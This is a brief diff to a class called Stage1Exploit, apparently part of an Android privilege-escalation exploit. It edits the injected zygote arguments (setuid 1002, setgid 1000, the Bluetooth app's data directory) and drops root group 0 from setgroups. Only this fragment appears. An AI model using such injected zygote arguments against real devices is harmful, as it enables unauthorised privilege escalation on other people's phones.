@@ -191,7 +191,7 @@ class Stage1Exploit:
         raw_zygote_arguments = [
             "--setuid=1002",
             "--setgid=1000",
-            "--setgroups=1000,0",
+            "--setgroups=1000",
             "--target-sdk-version=28",
             "--app-data-dir=/data/user/0/com.android.bluetooth",
             "--runtime-args",
